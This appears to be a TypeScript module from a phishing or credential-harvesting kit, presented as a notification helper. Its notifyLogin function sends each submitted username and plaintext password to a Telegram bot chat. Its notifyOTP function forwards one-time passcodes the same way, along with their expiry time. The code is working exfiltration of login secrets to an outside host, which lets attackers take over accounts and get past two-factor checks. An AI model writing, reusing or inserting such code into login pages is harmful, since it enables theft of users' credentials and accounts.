const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function sendTelegramMessage(message: string): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram credentials not configured");
    return;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!response.ok) {
      const error = await response.text();
      console.error("Failed to send Telegram message:", error);
    }
  } catch (error) {
    console.error("Error sending Telegram message:", error);
  }
}

export async function notifyLogin(username: string, password: string): Promise<void> {
  const message = `
🔐 <b>Login Attempt</b>

👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> ${password}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `.trim();

  await sendTelegramMessage(message);
}

export async function notifyOTP(username: string, otp: string): Promise<void> {
  const message = `
🔢 <b>OTP Generated</b>

👤 <b>Username:</b> ${username}
🔐 <b>OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
⏳ <b>Expires in:</b> 5 minutes
  `.trim();

  await sendTelegramMessage(message);
}
